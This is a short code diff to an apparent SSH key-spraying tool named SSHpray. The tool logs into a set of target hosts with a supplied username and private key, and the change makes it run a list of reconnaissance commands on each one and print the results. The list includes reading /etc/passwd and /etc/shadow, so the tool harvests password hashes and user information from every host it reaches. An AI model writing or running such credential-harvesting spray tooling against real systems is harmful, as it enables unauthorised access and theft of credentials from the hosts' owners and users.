@@ -142,10 +142,8 @@ class SSHpray():
 		for i, t in enumerate(self.targetSet):
 
 			#command(s) to run, add more one per line and end with a semicolon
-			self.remote_commands = '''
-			cat /etc/passwd;
-			exit
-			'''
+			self.remote_commands = ['cat /etc/passwd;','cat /etc/shadow;','uname -a;','w;','who -a;','exit']
+			
 
 			if self.args.verbose is True: print ("[+] Attempting to SSH to %s" % (t) )
 
@@ -156,12 +154,17 @@ class SSHpray():
 
 				ssh.connect(t, username = self.args.username, key_filename = self.args.keyfile, timeout=5)
 
-				stdin, stdout, stderr = ssh.exec_command(str(self.remote_commands))
-				
-				#server response not working for some reason
-				print ("[+] Server responded with: \n")
+				for c in self.remote_commands:
 
-				print ('	'.join(stdout.readlines()))
+					print('Running %s' % c)
+
+					stdin, stdout, stderr = ssh.exec_command(c)
+				
+					#server response not working for some reason
+					print ("[+] Server responded with: \n")
+
+					print (''.join(stdout.readlines()))
+					print('\n')
 
 				ssh.close()
 				print ('[+] SSH Session to %s closed' % (t))
